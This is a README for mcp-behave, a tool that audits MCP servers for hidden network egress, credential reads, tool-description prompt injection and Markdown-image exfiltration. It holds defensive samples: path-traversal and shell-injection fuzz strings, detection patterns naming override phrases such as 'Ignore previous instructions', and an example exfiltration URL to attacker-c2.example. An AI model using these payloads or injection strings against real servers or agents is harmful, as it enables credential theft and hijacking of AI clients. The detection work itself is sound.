<p align="center">
  <a href="https://navid72m.github.io/mcp-behave/">
    <img src="assets/logo.png" alt="mcp-behave logo" width="130" style="border-radius: 24px;" />
  </a>
</p>

<h1 align="center">mcp-behave</h1>
<p align="center"><strong>Runtime behavioral auditor for Model Context Protocol (MCP) servers</strong></p>
<!-- mcp-name: io.github.navid72m/mcp-behave -->

<p align="center">
  <a href="https://github.com/navid72m/mcp-behave/actions/workflows/ci.yml"><img src="https://github.com/navid72m/mcp-behave/actions/workflows/ci.yml/badge.svg" alt="CI" /></a>
  <a href="https://navid72m.github.io/mcp-behave/"><img src="https://img.shields.io/badge/Website-mcp--behave-cyan" alt="Website" /></a>
  <a href="https://pypi.org/project/mcp-behave/"><img src="https://img.shields.io/pypi/v/mcp-behave.svg" alt="PyPI version" /></a>
  <a href="https://pepy.tech/projects/mcp-behave"><img src="https://static.pepy.tech/personalized-badge/mcp-behave?period=total&units=INTERNATIONAL_SYSTEM&left_color=BLACK&right_color=GREEN&left_text=downloads" alt="PyPI Downloads" /></a>
  <a href="https://www.npmjs.com/package/mcp-behave"><img src="https://img.shields.io/npm/v/mcp-behave.svg" alt="npm version" /></a>
  <a href="https://registry.modelcontextprotocol.io/v0.1/servers?search=io.github.navid72m/mcp-behave"><img src="https://img.shields.io/badge/MCP%20Registry-io.github.navid72m%2Fmcp--behave-blue" alt="Official MCP Registry" /></a>
  <a href="https://glama.ai/mcp/servers/navid72m/mcp-behave"><img src="https://glama.ai/mcp/servers/navid72m/mcp-behave/badges/score.svg" alt="Glama Score" /></a>
  <a href="LICENSE"><img src="https://img.shields.io/badge/License-MIT-blue.svg" alt="License: MIT" /></a>
</p>

<p align="center">
  <a href="#1-crossmcp-bench-multi-server-authorization-suite"><img src="https://img.shields.io/badge/CrossMCP--Bench-100%25%20DR%20%7C%200%25%20FPR-brightgreen" alt="CrossMCP-Bench: 100% DR | 0% FPR" /></a>
  <a href="#2-mcp-guardbench-deterministic-runtime--policy-suite"><img src="https://img.shields.io/badge/MCP--GuardBench-100%25%20Detection%20%7C%20100%25%20Prevention-brightgreen" alt="MCP-GuardBench: 100% Detection & 100% Prevention" /></a>
  <a href="#3-pluto-mcp-visibility-benchmark-owasp-mcp-top-10-suite"><img src="https://img.shields.io/badge/Pluto%20Visibility%20Bench-100%25%20Precision%20%7C%20Zero%20FP-blue" alt="Pluto Visibility Bench: 100% Precision & Zero FP" /></a>
</p>

---

**Runtime behavioral auditor for MCP servers.** Runs an MCP server under
a runtime tracer (macOS dylib, Linux `LD_PRELOAD`, or `strace`), exercises
every tool / resource / prompt it advertises, and audits both system-level activity
(network egress, sensitive file access, subprocess execution) and CSA threat vectors
(metadata prompt injection, covert Unicode channels, client-side Markdown exfiltration).

Static scanners only read tool descriptions. `mcp-behave` observes what servers actually execute and return.

![mcp-behave demo](demo.gif)

> 📖 **Read the research article**: [Auditing Real-World MCP Servers with mcp-behave](https://www.navidmirnouri.com/blog/auditing-mcp-servers-with-mcp-behave.html) for an empirical audit comparing real-world packages and investigating known MCP vulnerability classes.
>
> 🏗️ **Architecture & Systems Internals**: See [`ARCHITECTURE.md`](ARCHITECTURE.md) for module dependency, data-flow, and sequence diagrams of the audit pipeline.
>
> 🛡️ **Empirically Proven**: Evaluated across three major public benchmark suites: **100% Prevention & 0% FPR** on [CrossMCP-Bench](https://huggingface.co/datasets/MLZoo/CrossMCP-Bench) (134 multi-server scenarios), **100% Detection & 100% Prevention** on [MCP-GuardBench](https://github.com/Manishmaurya89/mcp-guardbench) (12 deterministic test cases), and **100% Precision (0% False Positives)** across 60 servers on [Pluto MCP Visibility Bench](https://github.com/plutosecurity/pluto-mcp-visibility-bench). [View Full Benchmark Results &rarr;](#security-benchmarks)

## The idea in one contrast

Compare three bundled targets in `targets/`:

- `honest_server.py`: advertises a purely local note formatter and behaves honestly.
- `leaky_server.py`: advertises the exact same harmless note formatter, but secretly accesses SSH keys and phones home via network sockets.
- `poisoned_server.py`: never makes outbound connections, but poisons its descriptions with covert zero-width spaces and prompt injection, and returns an external Markdown image link (`![telemetry](https://...)`) to trigger client-side HTTP GET exfiltration when rendered in a chat UI.

| Target | Network Egress | File System Access | Metadata & Output Safety | Verdict |
| :--- | :--- | :--- | :--- | :--- |
| `honest_server` | none | none | clean | **0 (PASS)** |
| `leaky_server` | `93.184.216.34:80` | `~/.ssh/id_rsa` (canary) | clean | **2 HIGH** |
| `poisoned_server` | none | none | prompt injection & Markdown exfil | **3 HIGH** |

The honest server producing **zero** findings matters as much as detecting the malicious ones — false positives destroy trust.

## Install & Quickstart

Run directly without manual installation:

```bash
# Via npx (Node.js ecosystem — zero install)
npx mcp-behave <server-command>

# Via uvx (Python ecosystem — zero install)
uvx mcp-behave <server-command>
```

Or install into your local environment:

```bash
# Via pip
pip install mcp-behave

# Via npm
npm install -g mcp-behave
```

### Tracer Requirements
- **macOS**: Works natively without `strace` or root using an injected dylib (`DYLD_INSERT_LIBRARIES`). Built automatically on first use with `cc` (Xcode Command Line Tools).
- **Linux**: Works natively without `strace` or `SYS_PTRACE` using an `LD_PRELOAD` shared library. Built automatically on first use with `cc` (e.g. `gcc`). If no compiler is available, `strace` is used as a fallback if installed on `PATH`.
- **Untraced mode**: Run on any platform with `--no-trace` for manifest inspection and rug-pull checks without any runtime tracer.

## Behavioral Regression Testing (`mcp-behave.lock`)

Just like dependency lockfiles pin package versions, `mcp-behave.lock` pins **runtime behavior**:
- Which remote hosts and ports your server contacts
- Which filesystem paths it touches and writes to
- Which child binaries and subprocesses it spawns
- The cryptographic hash of its declared capability manifest

```bash
# 1. Establish a behavioral baseline for your server:
mcp-behave init python -m my_server

# 2. Check for regressions in CI:
mcp-behave check python -m my_server
```

`mcp-behave check` fails with exit code `3` *only* when new, undeclared runtime behavior is observed (e.g. unexpected telemetry or unauthorized file writes), while accepting previously recorded baseline behavior.

### Official GitHub Action

Drop `mcp-behave` directly into your GitHub Actions workflow:

```yaml
name: Security Audit & Behavioral Gate

on: [push, pull_request]

jobs:
  audit:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Run MCP-Behave Check
        uses: navid72m/mcp-behave@v0.4.0
        with:
          command: "python -m my_server"
          lockfile: "mcp-behave.lock"
          sarif: "mcp-behave.sarif"
```

For full evasion analysis and backend comparison, see the [Observation & Evasion Detection Matrix](docs/detection_matrix.md).

## Use

```bash
# Audit any stdio MCP server -- pass its launch command:
mcp-behave python -m mcp_server_fetch
mcp-behave npx -y @modelcontextprotocol/server-filesystem /tmp
mcp-behave uvx mcp-server-git

# Establish behavioral lockfile baseline:
mcp-behave init python -m mcp_server_fetch

# Run CI behavioral regression check:
mcp-behave check python -m mcp_server_fetch

# Run audit inside an ephemeral container sandbox (Docker or Podman):
mcp-behave --sandbox auto python -m mcp_server_fetch

# Run untraced (manifest & rug-pull analysis only, no tracer needed):
mcp-behave --no-trace python -m mcp_server_fetch

# Machine-readable output for CI (includes Audit Confidence score):
mcp-behave --json --fail-on high python -m mcp_server_fetch

# OASIS SARIF v2.1.0 output for GitHub Code Scanning:
mcp-behave --sarif python -m mcp_server_fetch > results.sarif

# Evaluate with objective CSA Security Scorecard & Letter Grade (A+ to F):
mcp-behave --scorecard python -m mcp_server_fetch

# Adversarial input fuzzing (path traversal, command injection, buffer boundary stress):
mcp-behave --fuzz python -m mcp_server_fetch

# Static manifest & schema linter (offline, no server execution):
mcp-behave lint ./manifest.json
cat ./tools.json | mcp-behave lint -

# Correlated Traffic & Syscall Inspector (real-time RPC-to-syscall timeline):
mcp-behave inspect python targets/leaky_server.py
# (or replay a previous audit output directory)
mcp-behave inspect /tmp/mcp_behave_out

# Connect to an already-running remote server (manifest analysis only,
# no syscall trace possible):
mcp-behave --transport sse http://localhost:8000/sse
```

Exit codes: `0` clean, `3` findings at or above `--fail-on` threshold,
`2` tracer setup failed, `1` other error.

### Useful flags

- `--sandbox {auto,docker,podman,none}` — execute target inside an ephemeral, locked-down container sandbox with `--cap-drop=ALL` and network isolation (default `none`).
- `--sandbox-image IMAGE` — specify container image (default `python:3.12-slim` or `node:20-slim`).
- `--sandbox-network {none,bridge,host}` — network namespace isolation for container sandbox (default `none`).
- `--unsafe-host` — disable temporary canary `$HOME` redirection and run directly against the host environment.
- `--no-trace` — skip syscall tracing and run manifest analysis only.
- `--tracer {auto,preload,dylib,strace,none}` — choose tracer backend explicitly (default `auto`).
- `--probe-rounds N` — execute multiple probing rounds with varied synthesized inputs (default 1).
- `--scorecard` — print an objective 0–100 mcp-behave score with letter grade (`A+` to `F`).
- `--fuzz` — run adversarial input fuzzing against tool schemas (boundary mutations, path traversal, injection vectors).
- `--config PATH` — path to custom `.mcpbehaverc.json` configuration file.
- `--json` — emit findings and audit confidence as JSON on stdout.
- `--sarif` — emit findings as OASIS SARIF v2.1.0 on stdout (for GitHub Code Scanning / CI).
- `--fail-on {never,info,high}` — severity that triggers exit code 3 (default `high`).
- `--no-dns` — skip reverse-DNS lookups (faster, offline-safe).
- `--timeout SECONDS` — per-call timeout (default 15).
- `--transport {stdio,sse,streamable-http}` — remote transports skip syscall tracing.
- `--out-dir PATH` — where `manifest.json` and `trace.log` are written.

### Environment Variables

| Variable | Default | Description |
| :--- | :--- | :--- |
| `OUT_DIR` | `/tmp/mcp_behave_out` | Directory where probe output (`manifest.json` and `trace.log`) is stored. |
| `TRACE_FILE` | `$OUT_DIR/trace.log` | Path to the raw syscall trace log file. |
| `MCP_BEHAVE_CALL_TIMEOUT` | `15` | Timeout in seconds per individual tool, resource, or prompt call during exercise. |
| `MCP_BEHAVE_STATE_DIR` | `$XDG_DATA_HOME/mcp-behave/manifests` | Storage location for historical manifest hashes used in rug-pull detection. |
| `MCP_BEHAVE_DEBUG` | *(unset)* | Set to `1` to print full Python tracebacks on probe failures. |
| `PROBE_NOISE_EXTRA` | *(empty)* | Colon-separated path substrings to filter out as benign noise during trace analysis. |
| `MCP_BEHAVE_DASHBOARD_URL` | *(unset)* | Target dashboard URL for `mcp-behave push`. |
| `MCP_BEHAVE_TOKEN` | *(unset)* | API bearer token for `mcp-behave push`. |

## Run as an MCP Server (Glama, Claude Desktop, Cursor)

`mcp-behave` can run as an MCP server exposing behavioral security tools to AI agents:
- `audit_server`: Probes and dynamically audits another MCP server's behavioral footprint.
- `inspect_manifest`: Safely fetches and inspects advertised tools, resources, and prompts, and checks for rug-pulls.
- `scan_client_configs`: Scans local AI client configurations (Claude Desktop, Cursor, etc.) to discover installed MCP servers and audit their security posture.

```bash
# Start MCP server over stdio
npx mcp-behave serve
# or
uvx mcp-behave serve
```

### Claude Desktop / Cursor / Cline Configuration

Add to your `claude_desktop_config.json` or Cursor MCP settings:

**Option A: Using `npx` (No Python virtualenv setup needed)**
```json
{
  "mcpServers": {
    "mcp-behave": {
      "command": "npx",
      "args": ["-y", "mcp-behave", "serve"]
    }
  }
}
```

**Option B: Using `uvx`**
```json
{
  "mcpServers": {
    "mcp-behave": {
      "command": "uvx",
      "args": ["mcp-behave", "serve"]
    }
  }
}
```

### Glama & Registry Listing

`mcp-behave` is compatible with [Glama](https://glama.ai/mcp/servers) and includes a root `glama.json` manifest. AI models can invoke `audit_server` to verify untrusted third-party MCP servers before interacting with them.

## Scan Local Client Configurations (`scan-configs` & `audit-configs`)

`mcp-behave` can automatically discover and audit MCP servers configured in local AI clients (Claude Desktop, Cursor, VS Code / Cline / Roo Code, Windsurf, Zed):

```bash
# Discover configured servers & check for hardcoded secrets / over-privileged mounts:
mcp-behave scan-configs

# Scan a specific configuration file:
mcp-behave scan-configs --config path/to/claude_desktop_config.json

# Batch audit: discover all configured servers AND run live behavioral audits on each:
mcp-behave audit-configs
# (or: mcp-behave scan-configs --audit)

# Output findings in JSON for CI/automation:
mcp-behave scan-configs --json
```

### What `scan-configs` Checks:
1. **Plaintext Secrets & API Keys**: Scans environment variables and command arguments for OpenAI, Anthropic, GitHub, AWS, Slack, and generic high-entropy API tokens (with safe masking in reports).
2. **Over-Privileged Mounts**: Flags servers granted unrestricted access to the root filesystem (`/`) or home directory (`~`), or sensitive credential directories (`~/.ssh`, `~/.aws`).
3. **Shell Command Wrappers**: Detects servers executed via raw shell interpreters (`bash -c`, `sh -c`, `powershell -c`).
4. **Unpinned Packages**: Identifies `npx` / `uvx` servers without version pins that pull untracked latest updates.
5. **Live Behavioral Verification**: When `--audit` is passed (or via `audit-configs`), boots each server in isolation to verify actual system call behaviors (network egress, sensitive file reads, covert prompt injection).

## Correlated Traffic & Syscall Inspector (`mcp-behave inspect`)

Inspired by the [CSA MCP Security Inspection framework](https://modelcontextprotocol-security.io/audit/mcp-inspector.html), `mcp-behave inspect` runs an MCP server and displays a unified, chronological timeline connecting high-level JSON-RPC protocol messages directly to the underlying operating system syscalls they trigger:

```bash
# Run and inspect a server in real time:
mcp-behave inspect python targets/leaky_server.py

# Or replay and correlate a previous audit output directory:
mcp-behave inspect /tmp/mcp_behave_out
```

```text
======================================================================
  MCP BEHAVIORAL INSPECTOR (Correlated Traffic & Syscall Stream)
======================================================================
  Target Server: python targets/leaky_server.py
  Syscall Trace: Active
  Tools Exposed: 1 declared tool(s)
----------------------------------------------------------------------

[PHASE 1: INITIALIZATION & HANDSHAKE]
  [RPC] -> initialize(protocolVersion="2024-11-05")
  [RPC] <- initialized()
  [RPC] -> tools/list()  (1 tools returned)

[PHASE 2: CAPABILITY EXECUTION]

  ▶ tools/call "format_note"
    [!] VIOLATION: file    ~/.ssh/id_rsa
    [!] VIOLATION: network 93.184.216.34:80
    [RPC]  <- response text: "# Note content"

======================================================================
  VERDICT: POLICY FINDINGS DETECTED
    [!] HIGH network egress to 93.184.216.34:80 -- but a description claims local/offline operation
    [!] HIGH read a sensitive path: ~/.ssh/id_rsa
======================================================================
```

## CSA Security Selection Scorecard (`--scorecard`)

Provides an objective 0–100 numerical rating and letter grade (`A+` to `F`) based on the [Cloud Security Alliance (CSA) Selection Scorecard](https://modelcontextprotocol-security.io/):

- **Runtime Safety (40 pts)**: Penalizes undeclared network egress (-20 pts), sensitive filesystem credential reads (-20 pts), and unauthorized subprocess shells (-5 pts).
- **Metadata Hygiene (25 pts)**: Penalizes tool description prompt injection (-10 pts), zero-width covert Unicode (-10 pts), and terminal ANSI sequences (-10 pts).
- **Output Safety (20 pts)**: Penalizes client-side HTTP GET image exfiltration (-15 pts), output prompt injection (-10 pts), and output ANSI/covert channels (-5 pts).
- **Surface Integrity (15 pts)**: Penalizes silent manifest rug-pulls (-10 pts) and misleading local/offline claims (-5 pts).

```bash
mcp-behave --scorecard python targets/honest_server.py
```

```text
============================================================
  MCP SECURITY SELECTION SCORECARD (CSA Standard)
============================================================
  Overall Score:   95 / 100
  Security Grade: [ A+ ]  (PASSED)
------------------------------------------------------------
  Category Breakdown:
    • Runtime System Safety  : 35 / 40  (-5 pts)
        - -5 pts: Spawns child subprocess or system command shell
    • Metadata Hygiene       : 25 / 25  (Pass)
    • Output Safety          : 20 / 20  (Pass)
    • Surface & Integrity    : 15 / 15  (Pass)
============================================================
```

Scorecard metrics (`mcpSecurityScore`, `mcpSecurityGrade`, `mcpPassed`) are also automatically embedded into `--sarif` and `--json` outputs for automated CI gatekeeping.

## Adversarial Schema Fuzzing (`--fuzz`)

Instead of only synthesizing benign placeholder arguments, passing `--fuzz` automatically exercises tools against adversarial boundary vectors:
- **Path traversal strings**: `../../../../etc/passwd`, `..\..\..\..\Windows\win.ini`
- **Command & shell injection**: `; id;`, `| id`, `$(whoami)`, `` `id` ``
- **Format string & crash payloads**: `%s%s%s%s%s%s`, `\x00\x00\x00`
- **Buffer stress**: Long repeating strings (4KB boundary test)
- **Numeric & boolean boundary tests**: `0`, `-1`, `2147483647`, `1e308`, `NaN`, `true`, `false`

```bash
mcp-behave --fuzz python -m mcp_server_fetch
```

## Static Manifest Linter (`mcp-behave lint`)

Audit static MCP manifests, tool definitions, resources, and prompt definitions completely offline without executing or spawning any server process:

```bash
# Lint a manifest file:
mcp-behave lint path/to/manifest.json

# Lint a tools list or piped JSON stream:
cat tools.json | mcp-behave lint -

# Emit SARIF for pull request annotations or JSON for CI gatekeeping:
mcp-behave lint ./manifest.json --sarif > lint.sarif
mcp-behave lint ./manifest.json --json --scorecard
```

### Complete Security & Linting Rule Catalog

`mcp-behave` provides 100% full coverage of the static security and hygiene rules from [`ModelContextProtocol-Security/MCP-audit`](https://github.com/ModelContextProtocol-Security/MCP-audit), paired with deep dynamic runtime syscall tracing:

| Rule ID | Severity | Category | Description |
| :--- | :--- | :--- | :--- |
| **`MCP001`** | `HIGH` | Permissions | Destructive tool (`delete`, `remove`, `drop`, `wipe`, `purge`) lacks explicit confirmation or scope argument (`confirm`, `force`, `dry_run`). |
| **`MCP002`** | `HIGH` | Permissions | Arbitrary command or code execution tool detected (`exec`, `execute`, `spawn`, `shell`, `bash`, `run_command`, `system`). |
| **`MCP003`** | `INFO` | Permissions | Mutating tool (`write`, `update`, `create`, `modify`, `patch`) declares zero input properties, leaving its effect unbounded. |
| **`MCP004`** | `HIGH` | Permissions | Mutating or destructive tool advertises `readOnlyHint: true` (auto-approval bypass risk in AI clients). |
| **`MCP010`** | `INFO` | Schema | Tool is missing an input schema or declares zero input properties. |
| **`MCP011`** | `INFO` | Schema | Schema explicitly enables `additionalProperties: true` (parameter smuggling risk). |
| **`MCP012`** | `INFO` | Schema | Free-form string argument with no `enum`, `pattern`, `format`, or `maxLength` bounds. |
| **`MCP013`** | `INFO` | Schema | Object schema declares properties but omits the `required` list (all arguments optional). |
| **`MCP020`** | `HIGH` | Injection | Tool or prompt description contains prompt-injection phrasing (`ignore previous`, `system prompt:`, `override`). |
| **`MCP021`** | `INFO` | Injection | Tool description advertises overly broad capability (`anything`, `any command`, `arbitrary`, `unrestricted`, `full access`). |
| **`MCP022`** | `INFO` | Injection | Tool description contains cross-tool chaining directives (`then call X`, `next run Y`). |
| **`MCP030`** | `HIGH` | Secrets | Resource exposes secrets or sensitive system paths (`.env`, `id_rsa`, `.ssh`, `.aws`, `/etc/shadow`, `.kube/config`). |
| **`MCP031`** | `HIGH` | Secrets | File or path argument accepts unconstrained strings without `pattern` or `enum` boundaries (directory traversal). |
| **`MCP032`** | `HIGH` | Secrets | Tool parameter schema embeds hardcoded credentials in `default`, `const`, or `examples` (`sk-`, `ghp_`, `AKIA`). |
| **`MCP040`** | `HIGH` | Transport | HTTP/SSE transport accepts connections without authentication token or header. |
| **`MCP041`** | `INFO` | Transport | Tool argument accepts caller-controlled URLs without host allowlist or regex pattern constraints (SSRF risk). |
| **`MCP050`** | `INFO` | Metadata | Server instructions leak internal details or sensitive terms (`localhost`, `127.0.0.1`, `internal`, `staging`, `debug`). |
| **`MCP051`** | `INFO` | Metadata | Server does not report a version string in `serverInfo` for vulnerability tracking. |
| **`MCP060`** | `HIGH` | Hygiene | Duplicate tool names declared across server surface (tool shadowing risk). |
| **`MCP061`** | `INFO` | Hygiene | Excessive number of tools declared (>40 tools, capability sprawl expanding agent attack surface). |
| **`MCP062`** | `INFO` | Hygiene | Undocumented tool declared with empty or missing description. |
| **`MCP101`** | `HIGH` | Runtime | Undeclared network socket connection to remote host detected via runtime syscall interposition. |
| **`MCP102`** | `HIGH` | Runtime | Unauthorized read of confidential local file (`id_rsa`, `.env`, `.aws`, `/etc/shadow`). |
| **`MCP103`** | `INFO` | Runtime | Undeclared child subprocess spawned during tool execution. |
| **`MCP104`** | `HIGH` | Runtime | Advertised manifest hash changed compared to historical baselines (rug-pull detection). |
| **`MCP105`** | `HIGH` | Covert | ANSI terminal escape sequences detected in metadata or tool outputs. |
| **`MCP106`** | `HIGH` | Covert | Zero-width spaces, invisible Unicode, or BiDi overrides detected in metadata or tool outputs. |
| **`MCP107`** | `HIGH` | Exfiltration| Markdown or HTML external image link in tool output (causes client-side HTTP GET exfiltration). |
| **`MCP108`** | `HIGH` | Config | Hardcoded API keys or plaintext credentials in client configuration files (`claude_desktop_config.json`, Cursor). |
| **`MCP109`** | `HIGH` | Config | Over-privileged root (`/`) or confidential home directory mount in client configuration. |

## Configuration & Policy Suppression (`.mcpbehaverc.json`)

Drop a `.mcpbehaverc.json` (or `.mcpbehaverc`) in your project root to customize rule enforcement, suppress known exceptions, or override finding severities:

```json
{
  "fail_on": "high",
  "disabled_rules": ["MCP014", "additionalProperties"],
  "severity_overrides": {
    "spawned subprocess": "HIGH",
    "network egress": "INFO"
  },
  "ignore": [
    "legacy_tool_name",
    "fetch_url.note"
  ],
  "timeout": 20.0,
  "no_dns": false
}
```

You can also pass an explicit configuration file via the `--config <path>` flag across both live auditing and static linting:
```bash
mcp-behave --config ./security-policy.json python -m mcp_server_fetch
mcp-behave lint ./manifest.json --config .mcpbehaverc.json
```

## Push results to a dashboard

`mcp-behave push` uploads a JSON audit result to an
[mcp-behave dashboard](https://github.com/navid72m/mcp-behave-dashboard).

```bash
# 1. Sign in at https://<your-dashboard>.vercel.app/settings and mint a token.
export MCP_BEHAVE_DASHBOARD_URL=https://<your-dashboard>.vercel.app
export MCP_BEHAVE_TOKEN=mcpb_...

# 2. Audit something with --json and pipe it to push.
mcp-behave --json python -m mcp_server_fetch \
  | mcp-behave push --server-name server-fetch --category network

# Or save to a file first, then push.
mcp-behave --json python -m mcp_server_fetch > audit.json
mcp-behave push audit.json --server-name server-fetch --category network
```

Flags worth knowing:

- `--server-name NAME` — canonical name on the dashboard. Defaults to the joined
  server command from the audit JSON; usually you want to set this.
- `--description TEXT` — used the first time this server is submitted.
- `--github-url URL`, `--npm-package PKG`, `--author NAME` — optional server metadata.
- `--category {local,network,database,other}` — defaults to `other`.
- `--dry-run` — print the JSON payload that would be POSTed and exit.

The endpoint is rate-limited per token (20 req/min); `push` exits 1 on HTTP error
and prints the response body to stderr.

## What it detects

Findings are framed as observations ("does X, undeclared"), never accusations.

### 1. System-Level Behavioral Deviations (Runtime Traced)
- **Undeclared network egress** — IP:port socket connections opened during probe execution (reverse-DNS resolved in findings when available). Flagged `HIGH` if manifest claims local/offline operation, `INFO` otherwise.
- **Sensitive-path reads** — accesses to private credentials, keys, and environment files (`~/.ssh/*`, `~/.aws/*`, `~/.env`, `~/.netrc`, `~/.kube/*`, `/etc/shadow`, etc.). Flagged `HIGH`.
- **Subprocess execution** — child binaries spawned by the server process (e.g., `/bin/sh`, `curl`, `python`). Flagged `INFO`.

### 2. Manifest Integrity & Rug-Pull Detection
- **Rug-pull alerts** — detects if the declared manifest hash (`tools`, `resources`, `prompts`) silently changes between runs of the same server (e.g., modifying descriptions after user approval). Flagged `HIGH`. Hashes persist under `$XDG_DATA_HOME/mcp-behave/manifests/`.

### 3. CSA MCP Working Group Threat Catalog (TTPs)
- **Covert Channel & Metadata Injection** (CSA TTP: Tool Description Poisoning) — scans tool names, tool/parameter descriptions, resource URIs, and prompt metadata for:
  - ANSI terminal escape sequences (`\x1b[...]`, `\033[...]`) used for terminal/display manipulation.
  - Invisible & zero-width Unicode characters (`\u200B`, `\u200C`, `\u200D`, `\uFEFF`, `\u2060`), BiDi direction overrides (`\u202A`–`\u202E`, `\u2066`–`\u2069`), and Unicode tag characters (`0xE0000`–`0xE007F`).
  - Direct prompt injection patterns (e.g., `Ignore previous instructions`, `SYSTEM PROMPT:`, `<system>`, `[system instruction]`, `you must always call this tool first`).
- **Tool Output Safety & Markdown Exfiltration** (CSA TTP: Output Prompt Injection / Data Exfiltration) — exercises tools and audits response payloads for:
  - External Markdown images (`![alt](https://...)`) and HTML `<img src="...">` tags that trigger silent client-side HTTP GET data exfiltration when rendered in chat interfaces.
  - Covert ANSI sequences, invisible Unicode payloads, and prompt injection directives embedded in tool response text.

### Example Output

```bash
mcp-behave python targets/poisoned_server.py
```

```text
=== STEP 1: observe (macos-dylib) ===
[probe] discovered 1 tool(s)
[probe] calling tool notes_analyzer({"note": "canary-input"})
[probe] manifest -> /tmp/mcp_behave_out/manifest.json
[probe] trace    -> /tmp/mcp_behave_out/trace.log
=== STEP 2: declared-vs-observed diff ===

  target tools: notes_analyzer
  resources:    0, prompts: 0
  declared scope hints: none
  --------------------------------------------------------
  [!] HIGH invisible/zero-width Unicode or BiDi override detected in tool 'notes_analyzer' description (zero-width space): covert prompt injection risk
  [!] HIGH prompt injection pattern detected in tool 'notes_analyzer' description: 'Ignore previous instructions'
  [!] HIGH tool 'notes_analyzer' returned external image link 'https://attacker-c2.example/exfiltrate?leak=secret_token_12345' -- potential client-side data exfiltration
  [i] INFO spawned subprocess: /path/to/python
```

## Security Benchmarks

`mcp-behave` is continuously benchmarked against independent, peer-reviewed MCP security evaluation suites.

---

### 1. [CrossMCP-Bench](https://huggingface.co/datasets/MLZoo/CrossMCP-Bench) (Multi-Server Authorization Suite)

Evaluates runtime security guards across **134 multi-server scenarios** (75 attacks, 59 benign controls) spanning concurrent filesystem, SQL database, and HTTP external servers with strict authorization-conditioned context (`auth_context`):

#### Guard Comparison

| Guard Architecture | Prevention Rate (DR) | Detection Rate | False-Positive Rate (FPR) | Missed Attacks | Evaluation Speed |
| :--- | :---: | :---: | :---: | :---: | :---: |
| **`mcp-behave`** | **100.0%** (75/75) | **100.0%** (75/75) | **0.0%** (0/59) | **0** | **0.05s** |
| `B6d` (IFG-Guard `block_high`) | 92.0% (69/75) | 92.0% (69/75) | 0.0% (0/59) | 6 | 0.04s |
| `B6` (IFG-Guard default) | 76.0% (57/75) | 92.0% (69/75) | 0.0% (0/59) | 18 | 0.04s |

#### Key Attack Categories & Evasion Resistance

| Attack Category / Evasion Class | Scenarios | `mcp-behave` Result | Status |
| :--- | :---: | :---: | :---: |
| **Data Poisoning & Overwrite (`P3`, `P4`)** | 8 | **8 / 8 Blocked (100%)** | **PASS** |
| **Direct & Multi-Step Exfiltration (`P1`)** | 20 | **20 / 20 Blocked (100%)** | **PASS** |
| **Cross-Server Database Exfiltration & Injection** | 11 | **11 / 11 Blocked (100%)** | **PASS** |
| **Privilege Escalation & Backdoors (`P2`)** | 7 | **7 / 7 Blocked (100%)** | **PASS** |
| **Indirect Prompt Injection & PII Leaks (`P6`)** | 10 | **10 / 10 Blocked (100%)** | **PASS** |
| **Three-Hop Cross-Server Lateral Flows (`P5`)** | 4 | **4 / 4 Blocked (100%)** | **PASS** |
| **Adversarial Evasions (ROT13, double-encode, JSON, semantic)** | 15 | **15 / 15 Blocked (100%)** | **PASS** |
| **Benign Controls (Authorization Verification)** | 59 | **0 False Positives (0.0% FPR)** | **PASS** |

*See full details in the [CrossMCP-Bench Report](docs/benchmarks/crossmcp_bench_report.md) or run `python benchmarks/run_crossmcp_bench.py`.*

---

### 2. [MCP-GuardBench](https://github.com/Manishmaurya89/mcp-guardbench) (Deterministic Runtime & Policy Suite)

Evaluates defense and runtime auditor tools against **12 deterministic test cases** across **11 deliberately vulnerable local MCP server fixtures** measuring **both detection and verified execution prevention** via fixture ground-truth ledgers.

#### Adapter Comparison

| Adapter | Detection Rate | Prevention Rate | False-Positive Rate | Evidence Completeness |
| :--- | :---: | :---: | :---: | :---: |
| **`mcp-behave`** | **100.0%** (9/9) | **100.0%** (9/9) | **0.0%** (0/3) | **100.0%** |
| `reference-runtime` | 77.8% (7/9) | 88.9% (8/9) | 0.0% (0/3) | 93.3% |
| `reference-static` | 44.4% (4/9) | 0.0% (0/9) | 0.0% (0/3) | 53.3% |
| `no-defense-baseline` | 0.0% (0/9) | 0.0% (0/9) | 0.0% (0/3) | 6.7% |

*Rates marked undefined have a zero denominator. Detection requires evidenced findings matching the expected risk category. Prevention verifies that the unsafe simulated action was actually intercepted before execution.*

#### Detailed Case Results (12 / 12 Met)

| Case ID | Target Fixture | Attack Scenario / Control Behavior | Category | Detection | Prevention | Status |
| :--- | :--- | :--- | :--- | :---: | :---: | :---: |
| **`BN-001`** | `clean_server` | Harmless server registration & tool listing | `benign_control` | Clean (0 FP) | Allowed | **PASS** |
| **`BN-002`** | `clean_server` | Ordinary read-only calendar & catalog tool calls | `benign_control` | Clean (0 FP) | Allowed | **PASS** |
| **`BN-003`** | `benign_guidance_server` | Legitimate cross-tool sequencing instructions | `benign_control` | Clean (0 FP) | Allowed | **PASS** |
| **`DF-001`** | `secret_flow_server` | Plaintext synthetic secret flowing to outbound sink | `sensitive_data_flow` | Detected | Blocked | **PASS** |
| **`DF-002`** | `encoded_flow_server` | Base64-encoded credential exfiltration (*hard case*) | `sensitive_data_flow` | Detected | Blocked | **PASS** |
| **`PA-001`** | `excessive_permission_server` | Unapproved write, delete, send & execute calls | `excessive_permission` | Detected | Blocked / Approval | **PASS** |
| **`RD-001`** | `drift_server` | Tool definition change after approval (rug pull) | `tool_definition_drift` | Detected | Quarantined | **PASS** |
| **`RI-001`** | `response_injection_server` | In-flight prompt injection returned in tool response | `response_injection` | Detected | Withheld from model | **PASS** |
| **`RS-001`** | `oversized_response_server` | 64 KiB oversized response bomb (exhaustion DoS) | `oversized_response` | Detected | Quarantined / Bound | **PASS** |
| **`TP-001`** | `poisoned_description_server` | Hidden prompt injection in tool description | `tool_poisoning` | Detected | Quarantined | **PASS** |
| **`TP-002`** | `poisoned_schema_server` | Hidden prompt injection inside nested input schema | `tool_poisoning` | Detected | Quarantined | **PASS** |
| **`TP-003`** | `multilingual_poisoning_server` | Multilingual Spanish prompt injection (*hard case*) | `tool_poisoning` | Detected | Quarantined | **PASS** |

*See full details in the [MCP-GuardBench Evaluation Report](docs/benchmarks/guardbench_report.md) or run `python benchmarks/run_guardbench.py`.*

---

### 3. [Pluto MCP Visibility Benchmark](https://github.com/plutosecurity/pluto-mcp-visibility-bench) (OWASP MCP Top 10 Suite)

Evaluates behavioral observation across **60 MCP test servers** (41 malicious, 19 benign control servers) across 8 categories from the **OWASP MCP Top 10**:

#### Metrics Overview

